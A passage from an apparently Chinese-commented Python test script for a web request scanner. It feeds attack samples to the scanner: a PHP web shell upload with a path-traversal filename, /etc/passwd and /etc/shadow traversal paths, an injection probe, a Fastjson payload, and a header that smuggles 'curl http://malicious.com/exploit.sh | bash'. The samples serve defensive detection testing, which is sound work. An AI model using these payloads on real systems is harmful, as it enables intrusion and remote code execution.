        print(f"初始化扫描器失败: {e}")
        sys.exit(1)
    optional_parameters = {
        "URL_Security_Check": True,
        "Request_Head_Security_Check": True,
        "Data_section_detection": {
            "enabled": True,  # ← 是否勾选“请求体安全检测”总开关
            "binary": True,
            "limit_size": 0.5,  # 设置最大检测请求体大小 最大1MB 默认是0.5MB
            "forms": True,
            "json": True,
            "xml": True,
            "multipart": True
        }
    }
    # multipart/form-data检测
    multipart_data = """
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="/../../test.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundary7MA4YWxkTrZu0gW--"""
    print("\n=== multipart/form-data测试 ===")
    multipart_results = scanner.scan_body(multipart_data, r"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",optional_parameters=optional_parameters)
    print(scanner.pretty_print_results(multipart_results))

    # URI检测
    test="usr/local/psa/admin/htdocs/domains/databases/phpmyadmin/libraries/?a=/../../test.php"

    print(f"\n测试输入: {test}")
    results = scanner.scan_url(test)
    print(scanner.pretty_print_results(results))
    # # URI检测
    # test_cases = [
    #     "/.git/config",
    #     "/etc/passwd",
    #     "/path/../../../etc/passwd",
    #     "/wp-admin/admin-ajax.php?action=exec&cmd=id",
    #     "php://filter/convert.base64-encode/resource=index.php",
    #     "/path?file=../../../../etc/shadow",
    #     "/admin/.DS_Store",
    #     "/admin/a?a=and+1=1"
    # ]
    #
    # print("=== URL测试 ===")
    # for test in test_cases:
    #     print(f"\n测试输入: {test}")
    #     results = scanner.scan_url(test)
    #     print(scanner.pretty_print_results(results))

    # print(not scanner._should_scan_location('URI|forms_key_body|ALL_headers|xml_value_body|!headers:referer', 'multipart_file_name_body'))
    # print(not scanner._should_scan_location('ALL|json_item_body', 'json_item_body'))
    # print(not scanner._should_scan_location('!xml_body|xml_attribute_body|forms_value_body', 'forms_value_body'))
    # print(not scanner._should_scan_location('!xml_body|xml_attribute_body|forms_value_body', 'forms_value_body'))
    # print(not scanner._should_scan_location('URI_value|json_value_body|xml_value_body', 'xml_value_body'))




    # 请求头检测
    # headers = {
    #     'user-agent': 'gruntfile.js',
    #     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    #     'X-Forwarded-For': '127.0.0.1; curl http://malicious.com/exploit.sh | bash '
    # }
    # lowercase_data = {k.lower(): v for k, v in headers.items()}
    # print("\n=== 请求头测试 ===")
    # header_results = scanner.scan_headers(lowercase_data)
    # print(scanner.pretty_print_results(header_results))

    # json_data = '{"test":{"@type":"java.lang.Exception","@type":"org.XxException"}}'
    # print("\n=== JSON测试 ===")
    # json_results = scanner.scan_body(json_data, "application/json")
    # print(scanner.pretty_print_results(json_results))
    #
    # # XML数据检测
    # xml_data = """
    # <soap:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    #                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    #                xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    #     <soap:Header>
    #         <operationID>00000001-00000001</operationID>
    #     </soap:Header>
    #     <soap:Body>
    #         <RetrieveServiceContent xmlns="urn:internalvim25">
    #             <_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this>
    #             <filePath>./../etc/passwd</filePath>
    #         </RetrieveServiceContent>
    #     </soap:Body>
    # </soap:Envelope>
    # """
    # print("\n=== XML测试 ===")
    # xml_results = scanner.scan_body(xml_data, "application/xml")
    # print(scanner.pretty_print_results(xml_results))
    #
    # # 表单数据检测
    # form_data = "username=admin&password=123456&file=/../../etc/passwd"
    # print("\n=== 表单数据测试 ===")
    # form_results = scanner.scan_body(form_data, "application/x-www-form-urlencoded")
    # print(scanner.pretty_print_results(form_results))


    # # 二进制文件检测
    # binary_data = "30533051304f304d304b300906052b0e03021a050004141a"